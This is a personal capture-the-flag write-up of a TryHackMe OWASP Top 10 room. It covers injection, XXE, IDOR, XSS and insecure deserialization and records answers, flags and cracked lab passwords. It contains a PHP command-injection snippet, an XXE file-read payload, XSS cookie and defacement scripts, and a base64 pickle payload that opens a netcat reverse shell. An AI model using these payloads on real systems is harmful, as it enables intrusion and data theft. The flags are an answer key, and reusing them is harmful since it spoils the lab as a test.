# OWASP 10

> NKETIAH GODFRED
--------------------------

````
#blind injection
<?php

                if (isset($_GET["username"])) {
                    $username = $_GET["username"];
                    
                    $command = "awk -F: '{print $1}' /etc/passwd | grep $username";

                    $returned_user = exec($command);
                    if ($returned_user == "") {
                        $result = "<div class='alert alert-danger' role='alert'>
                        <strong>Error!</strong> User <b>$username</b> was not found on the <b>system</b>
                        </div>";
                    } else {
                        $result = "<div class='alert alert-success' role='alert'>
                        <strong>Success!</strong> User <b>$username</b> was found on the <b>system</b>
                        </div>";
                    }

                    echo $result;
                    
                    }

                ?>
`````
````
#broken access
````









# TASK 1 

This room breaks each OWASP topic down and includes details on what the vulnerability is, how it occurs and how you can exploit it. You will put the theory into practise by completing supporting challenges.


    Injection
    Broken Authentication
    Sensitive Data Exposure
    XML External Entity
    Broken Access Control
    Security Misconfiguration
    Cross-site Scripting
    Insecure Deserialization
    Components with Known Vulnerabilities
    Insufficent Logging & Monitoring

  ```
  completed
  ```


# Task 3
[Severity 1] Injection
Injection flaws are very common in applications today. These flaws occur because user controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies. Some common examples include:

    SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. 
    Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.


If an attacker is able to successfully pass input that is interpreted correctly, they would be able to do the following:

    Access, Modify and Delete information in a database when this input is passed into database queries. This would mean that an attacker can steal sensitive information such as personal details and credentials.
    Execute Arbitrary system commands on a server that would allow an attacker to gain access to users’ systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.


The main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands. There are different ways of doing this:

    Using an allow list: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.
    Stripping input: If the input contains dangerous characters, these characters are removed before they are processed.


Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or even just stripping input, there are various libraries that perform these actions for you.

```
completed
```

# Task 4
[Severity 1] OS Command Injection

Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.  Sometimes this won't always end in something malicious, like a whoami or just reading of files.  That isn't too bad.  But the thing about command injection is it opens up many options for the attacker.  The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as.  A simple ;nc -e /bin/bash is all that's needed and they own your server; some variants of netcat don't support the -e option. You can use a list of these reverse shells as an alternative. 

Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around.  Now that we know what command injection is, we'll start going into the different types and how to test for them.
```
completed
```

#  Task 5
[Severity 1] Command Injection Practical

What is Active Command Injection?

Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.  Active command injection will return the response to the user.  It can be made visible through several HTML elements. 

Let's consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet.  It's nowhere near finished but contains the same command injection vulnerability as before!  But this time, the response from the system call can be seen on the page!  They'll never learn!

Just like before, let's look at the sample code from evilshell.php and go over what it's doing and why it makes it active command injection.  See if you can figure it out.  I'll go over it below just as before.

EvilShell (evilshell.php) Code Example


In pseudocode, the above snippet is doing the following:

1. Checking if the parameter "commandString" is set

2. If it is, then the variable $command_string gets what was passed into the input field

3. The program then goes into a try block to execute the function passthru($command_string).  You can read the docs on passthru() on PHP's website, but in general, it is executing what gets entered into the input then passing the output directly back to the browser.

4. If the try does not succeed, output the error to page.  Generally this won't output anything because you can't output stderr but PHP doesn't let you have a try without a catch.

Ways to Detect Active Command Injection

We know that active command injection occurs when you can see the response from the system call.  In the above code, the function passthru() is actually what's doing all of the work here.  It's passing the response directly to the document so you can see the fruits of your labor right there.  Since we know that, we can go over some useful commands to try to enumerate the machine a bit further.  The function call here to passthru() may not always be what's happening behind the scenes, but I felt it was the easiest and least complicated way to demonstrate the vulnerability.  

Commands to try

Linux

    whoami
    id
    ifconfig/ip addr
    uname -a
    ps -ef

Windows

    whoami
    ver
    ipconfig
    tasklist
    netstat -an

To complete the questions below, navigate to http://MACHINE_IP/evilshell.php.
Answer the questions below
What strange text file is in the website root directory?
```
drpepper.txt
```

How many non-root/non-service/non-daemon users are there?
```
0
```

What user is this app running as?
```
www-data
```

What is the user's shell set as?
```
/usr/sbin/nologin
```

What version of Ubuntu is running?
```
18.04.4
```

Print out the MOTD.  What favorite beverage is shown?
```
Dr Pepper
```


#  Task 6 [Severity 2] Broken Authentication

Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions. 

If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include:

    Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. 
    Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.
    Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts. 

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

    To avoid password guessing attacks, ensure the application enforces a strong password policy. 
    To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.
    Implement Multi Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.


```
completed
```


#  Task 7 [Severity 2] Broken Authentication Practical

For this example, we'll be looking at a logic flaw within the authentication mechanism.

A lot of times what happens is that developers forgets to sanitize the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we are going to focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit i.e re-registration of an existing user.

Let's understand this with the help of an example, say there is an existing user with the name admin and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter " admin"(notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. That new user will also be able to see all the content presented under the user admin.

To see this in action go to http://MACHINE_IP:8888 and try to register a user name darren, you'll see that user already exists so then try to register a user " darren" and you'll see that you are now logged in and will be able to see the content present only in Darren's account which in our case is the flag that you need to retrieve.
Answer the questions below
What is the flag that you found in darren's account?
```

```

Now try to do the same trick and see if you can login as arthur.
```
fe86079416a21a3c99937fea8874b667
```

What is the flag that you found in arthur's account?
```
d9ac0f7db4fda460ac3edeb75d75e16e
```


# Task 8 [Severity 3] Sensitive Data Exposure (Introduction)

When a webapp accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the webserver itself...

The web application in this box contains one such vulnerability. Deploy the machine, then read through the supporting material in the following tasks as the box boots up.
```
completed
```

# Task 9 [Severity 3] Sensitive Data Exposure (Supporting Material 1)

The most common way to store a large amount of data in a format that is easily accessible from many locations at once is in a database. This is obviously perfect for something like a web application, as there may be many users interacting with the website at any one time. Database engines usually follow the Structured Query Language (SQL) syntax; however, alternative formats (such as NoSQL) are rising in popularity.

In a production environment it is common to see databases set up on dedicated servers, running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These databases are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up a full database server, and so could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.

As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually this would not be a problem for a webapp, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files that a user connecting to the website is able to access)? Well, we can download it and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure indeed!

That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.

The most common (and simplest) format of flat-file database is an sqlite database. These can be interacted with in most programming languages, and have a dedicated client for querying them on the command line. This client is called "sqlite3", and is installed by default on Kali.

Let's suppose we have successfully managed to download a database:

We can see that there is an SQlite database in the current folder.

To access it we use: sqlite3 <database-name>:

From here we can see the tables in the database by using the .tables command:

At this point we can dump all of the data from the table, but we won't necessarily know what each column means unless we look at the table information. First let's use PRAGMA table_info(customers); to see the table information, then we'll use SELECT * FROM customers; to dump the information from the table:

We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:

0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
 

We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).

In the next task we'll look at cracking this hash.
```
completed
```


#  Task 11 [Severity 3] Sensitive Data Exposure (Challenge)

It's now time to put what you've learnt into practice!
Answer the questions below
Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory. 

What is the name of the mentioned directory?
```
assets
```

Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
```
webapp.db
```

Use the supporting material to access the sensitive data. What is the password hash of the admin user?
```
6eea9b7ef19179a06954edd0f6c05ceb
```

Crack the hash.
What is the admin's plaintext password?
```
qwertyuiop
```

Login as the admin. What is the flag?
```
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

#  Task 12 [Severity 4] XML External Entity

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

This challenge is from our subscriber only material - happy hacking!
Answer the questions below
```
completed
```

#  Task 13
[Severity 4 XML External Entity - eXtensible Markup Language

Before we move on to learn about XXE exploitation we'll have to understand XML properly.

What is XML?

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data. 

Why we use XML?

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.

2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.

3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.

4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

Syntax

Every XML document mostly starts with what is known as XML Prolog.

<?xml version="1.0" encoding="UTF-8"?>


Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

Every XML document must contain a `ROOT` element. For example:

<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>


In the above example the <mail> is the ROOT element of that document and <to>, <from>, <subject>, <text> are the children elements. If the XML document doesn't have any root element then it would be consideredwrong or invalid XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like <to> then it has to end by </to> and not by something like </To>(notice the capitalization of T)

Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML. For example:
<text category = "message">You need to learn about XXE</text>

In the above example category is the attribute name and message is the attribute value.
Answer the questions below

Full form of XML
```
eXtensible markup language
```

Is it compulsory to have XML prolog in XML documents?
```
no
```

Can we validate XML documents against a schema?
```
yes
```

How can we specify XML version and encoding in XML document?
```
XML Prolog
```

#  Task 14 [Severity 4] XML External Entity - DTD

Before we move on to start learning about XXE we'll have to understand what is DTD in XML.

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

Let us try to understand this with the help of an example. Say we have a file named note.dtd with the following content:

<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses note.dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>


So now let's understand how that DTD validates the XML. Here's what all those terms used in note.dtd mean

    !DOCTYPE note -  Defines a root element of the document named note
    !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
    !ELEMENT to - Defines the to element to be of type "#PCDATA"
    !ELEMENT from - Defines the from element to be of type "#PCDATA"
    !ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
    !ELEMENT body - Defines the body element to be of type "#PCDATA"

    NOTE: #PCDATA means parseable character data.

Answer the questions below

How do you define a new ELEMENT?
```
!ELEMENT
```

How do you define a ROOT element?
```
!DOCTYPE
```

How do you define a new ENTITY?
```
!ENTITY
```

#  Task 15 [Severity 4] XML External Entity - XXE Payload

Now we'll see some XXE payload and see how they are working.

1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.

<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>


As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.

2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

Here again, we are defining an ENTITY with the name `read` but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.
Answer the questions below
Try the payload mentioned in description on the website.
```
completed
```

# Task 16 [Severity 4] XML External Entity - Exploiting
Now let us see some payloads in action. The payload that I'll be using is the one we saw in the previous task.

1) Let's see how the website would look if we'll try to use the payload for displaying the name.



On the left side, we can see the burp request that was sent with the URL encoded payload and on the right side we can see that the payload was able to successfully display name falcon feast

2) Now let's try to read the /etc/passwd

Answer the questions below
Try to display your own name using any payload.

See if you can read the /etc/passwd

What is the name of the user in /etc/passwd
```
falcon
```

Where is falcon's SSH key located?
```
/home/falcon/.ssh/id_rsa
```

What are the first 18 characters for falcon's private key
```
MIIEogIBAAKCAQEA7
```

#  Task 17 [Severity 5] Broken Access Control


Websites have pages that are protected from regular visitors, for example only the site's admin user should be able to access a page to manage other users. If a website visitor is able to access the protected page/pages that they are not authorised to view, the access controls are broken.

A regular visitor being able to access protected pages, can lead to the following:

    Being able to view sensitive information
    Accessing unauthorized functionality

OWASP have a listed a few attack scenarios demonstrating access control weaknesses:

Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
http://example.com/app/accountInfo?acct=notmyacct

Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo

If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw (reference to scenarios).

To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.
```
completed
```

#  Task 18 [Severity 5] Broken Access Control (IDOR Challenge)


IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://example.com/bank?account_number=1234. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.

There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.
Answer the questions below
Read and understand how IDOR works.

Deploy the machine and go to http://10.10.182.23 - Login with the username being noot and the password test1234.
```
completed
```

Look at other users notes. What is the flag?
```
flag{fivefourthree} 
```

#  Task 19 [Severity 6] Security Misconfiguration
Security Misconfiguration

Security Misconfigurations are distinct from the other Top 10 vulnerabilities, because they occur when security could have been configured properly but was not.

Security misconfigurations include:

    Poorly configured permissions on cloud services, like S3 buckets
    Having unnecessary features enabled, like services, pages, accounts or privileges
    Default accounts with unchanged passwords
    Error messages that are overly detailed and allow an attacker to find out more about the system
    Not using HTTP security headers, or revealing too much detail in the Server: HTTP header

This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.

For more info, I recommend having a look at the OWASP top 10 entry for Security Misconfiguration
Default Passwords

Specifically, this VM focusses on default passwords. These are a specific example of a security misconfiguration. You could, and should, change any default passwords but people often don't.

It's particularly common in embedded and Internet of Things devices, and much of the time the owners don't change these passwords.

It's easy to imagine the risk of default credentials from an attacker's point of view. Being able to gain access to admin dashboards, services designed for system administrators or manufacturers, or even network infrastructure could be incredibly useful in attacking a business. From data exposure to easy RCE, the effects of default credentials can be severe.

In October 2016, Dyn (a DNS provider) was taken offline by one of the most memorable DDoS attacks of the past 10 years. The flood of traffic came mostly from Internet of Things and networking devices like routers and modems, infected by the Mirai malware.

How did the malware take over the systems? Default passwords. The malware had a list of 63 username/password pairs, and attempted to log in to exposed telnet services.

The DDoS attack was notable because it took many large websites and services offline. Amazon, Twitter, Netflix, GitHub, Xbox Live, PlayStation Network, and many more services went offline for several hours in 3 waves of DDoS attacks on Dyn.
Practical example

This VM showcases a Security Misconfiguration, as part of the OWASP Top 10 Vulnerabilities list.

Deploy the VM, and hack in by exploiting the Security Misconfiguration!
Answer the questions below
Deploy the VM
```
completed
```

pensive:PensiveNotes

Hack into the webapp, and find the flag!
```
thm{4b9513968fd564a87b28aa1f9d672e17}
```
https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html



#  Task 20 [Severity 7] Cross-site Scripting
XSS Explained

Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:

    Stored XSS - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
    Reflected XSS - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
    DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.

For more XSS explanations and exercises, check out the XSS room[https://tryhackme.com/room/xss].

XSS Payloads

Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:

    Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
    Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
    XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
    Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.

XSS Challenge

The VM attached to this task showcases DOM-Based, Reflected and Stored XSS. Deploy the machine and exploit each type!


Answer the questions below
Deploy the VM
```
completed
```

Navigate to http://10.10.31.185/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
```
ThereIsMoreToXSSThanYouThink
```

On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
```
ReflectiveXss4TheWin
```
**<script>alert(window.location.hostname);</script>**


Now navigate to http://10.10.31.185/ in your browser and click on the "Stored XSS" tab on the navbar; make an account.
```
ReflectiveXss4TheWin
```

Then add a comment and see if you can insert some of your own HTML.
```
HTML_T4gs
```

On the same page, create an alert popup box appear on the page with your document cookies.
```
W3LL_D0N3_LVL2s
```
**<script> alert(document.cookies)</script>**

Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
```
websites_can_be_easily_defaced_with_xss
```
**<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>**

#  Task 21 [Severity 8] Insecure Deserialization
THM{compl3ted_the_quiz}
.:. OWASP10 - A8: Insecure Deserialisation .:.

"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" (Acunetix., 2017)

This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.

Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. We'll be explaining this process and why it is so commonplace in modern web applications.

OWASP rank this vulnerability as 8 out of 10 because of the following reasons:


- Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.

- The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.

What's Vulnerable?

At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:

- E-Commerce Sites
- Forums
- API's
- Application Runtimes (Tomcat, Jenkins, Jboss, etc)
Answer the questions below
Who developed the Tomcat application?
```
Apache Software Foundation
```

What type of attack that crashes services can be performed with insecure deserialization?
```
denial of service
```


#  Task 22 [Severity 8] Insecure Deserialization - Objects
﻿Objects

A prominent element of object-oriented programming (OOP), objects are made up of two things:
- State
- Behaviour

Simply, objects allow you to create similar lines of code without having to do the leg-work of writing the same lines of code again.

For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off - their behaviour!

Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use methods to simply alter the state and behaviour of the lamp.
Answer the questions below

Select the correct term of the following statement:


if a dog was sleeping, would this be:

A) A State
B) A Behaviour 

```
A Behaviour 
```



#  Task 23 [Severity 8] Insecure Deserialization - Deserialization
De(Serialization)

Learning is best done through analogies

A Tourist approaches you in the street asking for directions. They're looking for a local landmark and got lost. Unfortunately, English isn't their strong point and nor do you speak their dialect either. What do you do? You draw a map of the route to the landmark because pictures cross language barriers, they were able to find the landmark. Nice! You've just serialised some information, where the tourist then deserialised it to find the landmark.


Continued

Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.

Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.

What does this mean?

Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.

The process is best explained through diagrams:


How can we leverage this?

Simply, insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.
Answer the questions below
What is the name of the base-2 formatting that data is sent across a network as? 

```
binary
``` 


#  Task 24 [Severity 8] Insecure Deserialization - Cookies

Cookies 101

Ah yes, the origin of many memes. Cookies are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer. 

You'll see notifications like the above on most websites these days. Websites use these cookies to store user-specific behaviours like items in their shopping cart or session IDs.

In the web application, we're going to exploit, you'll notice cookies store login information like the below! Yikes!

Whilst plaintext credentials is a vulnerability in itself, it is not insecure deserialization as we have not sent any serialized data to be executed!

Cookies are not permanent storage solutions like databases. Some cookies such as session ID's will clear when the browser is closed, others, however, last considerably longer. This is determined by the "Expiry" timer that is set when the cookie is created.


Some cookies have additional attributes, a small list of these are below:
Attribute                           Description                                                         Required?
Cookie Name             The Name of the Cookie to be set                                                    Yes
Cookie Value            Value, this can be anything plaintext or encoded                                    Yes
Secure Only             If set, this cookie will only be set over HTTPS connections                         No
Expiry                  Set a timestamp where the cookie will be removed from the browser                   No
Path                    The cookie will only be sent if the specified URL is within the request             No

Cookies can be set in various website programming languages. For example, Javascript, PHP or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example. 

Setting cookies in Flask is rather trivial. Simply, this snippet gets the current date and time, stores it within the variable "timestamp" and then stores the date and time in a cookie named "registrationTimestamp". This is what it will look like in the browser.

Answer the questions below

If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?
```
webapp.com/login
```

What is the acronym for the web technology that Secure cookies work over?
```
HTTPS
```


#  Task 25 [Severity 8] Insecure Deserialization - Cookies Practical

Answer the questions below
1st flag (cookie value)
```
THM{good_old_base64_huh}
```

2nd flag (admin dashboard)
```
THM{heres_the_admin_flag}
```


#  Task 26 [Severity 8] Insecure Deserialization - Code Execution

.What makes this form vulnerable?

If a user was to enter their feedback, the data will get encoded and sent to the Flask application (presumably for storage within a database for example). However, the application assumes that any data encoded is trustworthy. But we're hackers. You can only trust us as far as you can fling us (and that's nigh-on impossible online)

Although explaining programming is a bit out of scope for this room, it's important to understand what's going on in the snippet below:



When you visit the "Exchange your vim" URL, A cookie is encoded and stored within your browser - perfect for us to modify! Once you visit the feedback form, the value of this cookie is decoded and then deserialised. Uh oh. In the snippet below, we can see how the cookie is retrieved and then deserialized via pickle.loads

This vulnerability exploits Python Pickle, which I have attached as reading material at the end of the room. We essentially have free reign to execute whatever we like such as a reverse shell.

The Exploit

Now I'm not going to leave you hanging dry here. First, we need to set up a netcat listener on our Kali. If you are a subscriber, you can control your own in-browser TryHackMe Kali Machine.

Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed. I will be detailing the steps below with provided material to do so.

Once this is complete, copy-and-paste the source code from this python file (pickelme.py) to your kali and modify the source code to replace your "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP. This can be obtained via the Access page.


1. Create a python file to paste into, I have used "rce.py" for these examples:


2. Paste the code from the GitHub site, replacing YOUR_TRYHACKME_VPN_IP with your TryHackMe VPN IP from the access page

3. Execute "rce.py" via python3 rce.py

4. Note the output of the command, it will look something similar to this:



5. Copy and paste everything in-between the two speech marks ('DATA'). In my case, I will copy and paste:

gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=    Yours may look slightly different, just ensure that you copy everything in-between the two speech marks ''


6. Paste this into the "encodedPayload" cookie in your browser:



7. Ensure our netcat listener is still running:

8. Refresh the page. It will hang, refer back to your netcat listener:


If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!
Answer the questions below
flag.txt
```
4a69a7ff9fd68
```


#  Task 27 [Severity 9] Components With Known Vulnerabilities - Intro

Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on exploit-db.

As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.

Hence, why OWASP has rated this a 3(meaning high) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.
Answer the questions below
Read above.
```
completed
```

#  Task 28 [Severity 9] Components With Known Vulnerabilities - Exploit

Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software, and research it until we can find an exploit. Let's go through that with an example web application using google database. 

```
completed
```


#  Task 29 [Severity 9] Components With Known Vulnerabilities - Lab

The following is a vulnerable application, all information you need to exploit it can be found online. 

Note: When you find the exploit script, put all of your input in quotes, for example "id"
Answer the questions below
How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
```
1611
```


#  Task 30 [Severity 10] Insufficient Logging and Monitoring

